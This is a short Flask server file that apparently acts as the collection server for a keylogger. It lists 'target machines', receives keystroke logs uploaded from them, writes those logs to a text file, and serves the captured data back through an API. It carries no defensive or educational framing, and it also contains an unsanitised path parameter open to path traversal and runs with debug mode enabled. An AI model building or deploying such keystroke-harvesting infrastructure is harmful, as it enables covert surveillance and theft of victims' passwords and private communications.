from flask import Flask, render_template, request, jsonify
import os
import json

app = Flask("__main__")

DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
data_list = []


@app.route("/")
def home():
    return render_template("home.html")


@app.route("/api/getTargetMachinesList", methods=["GET"])
def get_target_machines_list():
    all_machines = os.listdir(DATA_FOLDER)
    return jsonify(all_machines), 200


@app.route("/api/getData/<machine>", methods=["GET"])
def get_data(machine):
    machine_path = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_path):
        return jsonify({"error": "Machine not found"}), 404

    data_objects = {}
    for file_name in os.listdir(machine_path):
        file_path = os.path.join(machine_path, file_name)
        with open(file_path, "r", encoding="utf-8") as file:
            try:
                data_objects[f"{file_name.strip('.json')}"] = json.load(file)
            except json.JSONDecodeError:
                data_objects[f"{file_name.strip('.json')}"] = {"error": f"{file_name} is not valid JSON"}
    return jsonify(data_objects), 200


@app.route("/api/upload", methods=["POST"])
def upload_api():
    data = request.get_json()
    if not data or "machine" not in data or "data" not in data or not isinstance(data["data"], list):
        return jsonify({"error": "Invalid payload"}), 400

    with open("server_key_logs.txt", "a", encoding="utf-8") as f:
        for log_dict in data["data"]:
            for timestamp in log_dict:
                for key in log_dict[timestamp]:
                    f.write(f"{timestamp}\n{key}\n")

    data_list.append(data)
    print("Current data list:", data_list)
    return jsonify({"status": "success"}), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=True)
